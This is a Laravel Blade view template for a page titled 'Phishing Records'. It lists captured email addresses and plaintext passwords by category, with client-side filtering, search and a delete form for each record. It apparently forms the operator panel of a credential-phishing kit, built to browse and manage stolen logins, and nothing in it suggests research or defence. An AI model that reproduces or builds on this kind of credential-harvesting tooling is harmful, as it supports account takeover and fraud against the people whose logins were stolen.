@extends('layouts.app')

@section('content')
<div class="container">

    <h3 class="mb-4">Phishing Records</h3>

    <!-- Filter and Search -->
    <div class="row mb-3">
        <div class="col-md-4">
            <select id="categoryFilter" class="form-select">
                <option value="">All Categories</option>
                @foreach($phishings->pluck('category')->unique() as $cat)
                    <option value="{{ $cat }}">{{ $cat }}</option>
                @endforeach
            </select>
        </div>
        <div class="col-md-4 offset-md-4">
            <input type="text" id="searchInput" class="form-control" placeholder="Search email or password">
        </div>
    </div>

    <!-- Table -->
    <table class="table table-bordered table-striped" id="phishingTable">
        <thead class="table-light">
            <tr>
                <th>Category</th>
                <th>Email</th>
                <th>Password</th>
            </tr>
        </thead>
        <tbody>
            @foreach($phishings as $phishing)
            <tr>
                <td class="text-success">{{ $phishing->category }}</td>
                <td>{{ $phishing->email }}</td>
                <td>{{ $phishing->password }}</td>
                 <td>
             <form action="{{ route('phishing.destroy', $phishing->id) }}" method="POST" onsubmit="return confirm('Are you sure you want to delete this record?');">
            @csrf
            @method('DELETE')
            <button class="btn btn-danger btn-sm">Delete</button>
        </form>
    </td>
            </tr>
            @endforeach
        </tbody>
    </table>

</div>

<!-- Filter/Search Script -->
<script>
document.addEventListener('DOMContentLoaded', function() {
    const categoryFilter = document.getElementById('categoryFilter');
    const searchInput = document.getElementById('searchInput');
    const table = document.getElementById('phishingTable').getElementsByTagName('tbody')[0];

    function filterTable() {
        const category = categoryFilter.value.toLowerCase();
        const search = searchInput.value.toLowerCase();

        Array.from(table.rows).forEach(row => {
            const rowCategory = row.cells[0].innerText.toLowerCase();
            const rowEmail = row.cells[1].innerText.toLowerCase();
            const rowPassword = row.cells[2].innerText.toLowerCase();

            const matchesCategory = !category || rowCategory === category;
            const matchesSearch = !search || rowEmail.includes(search) || rowPassword.includes(search);

            row.style.display = (matchesCategory && matchesSearch) ? '' : 'none';
        });
    }

    categoryFilter.addEventListener('change', filterTable);
    searchInput.addEventListener('keyup', filterTable);
});
</script>
@endsection
